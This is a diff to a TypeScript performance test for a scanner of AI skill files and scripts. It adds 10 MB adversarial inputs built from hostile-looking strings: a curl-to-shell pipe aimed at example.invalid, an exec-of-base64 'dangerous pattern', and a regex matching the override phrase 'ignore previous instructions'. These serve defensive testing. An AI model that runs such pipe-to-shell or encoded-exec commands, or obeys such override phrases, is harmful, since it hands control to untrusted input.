@@ -16,6 +16,9 @@ const b64 = (s: string): string => Buffer.from(s).toString("base64");
 
 const CASES: Record<string, () => string> = {
   "long-pipes": () => fill("curl x |"),
+  // 0.3.0: reference pages under "Patterns" headings, and regex-looking script lines.
+  "pattern-headings": () => fill("## Dangerous code patterns\n```\nexec(base64.b64decode(\"ZWNobyBoZWxsbw==\"))\n```\n"),
+  "regex-lines": () => fill('(r"(?i)ignore\\s+previous\\s+instructions", "x"),\n'),
   "pipe-storm": () => fill("|"),
   "pipe-to-shell-storm": () => fill("curl https://example.invalid/a | sh\n"),
   "pipes-one-line": () => "curl https://example.invalid " + fill("| cat "),
@@ -62,7 +65,7 @@ const CASES: Record<string, () => string> = {
   "xattr-storm": () => fill("xattr -d "),
 };
 
-const SOURCES: ScriptSource[] = ["script", "skill-md"];
+const SOURCES: ScriptSource[] = ["script", "skill-md", "skill-doc"];
 
 describe(`10 MB adversarial skill inputs, scanned in under ${BUDGET_MS} ms`, () => {
   test.each(Object.keys(CASES))("%s", (name) => {
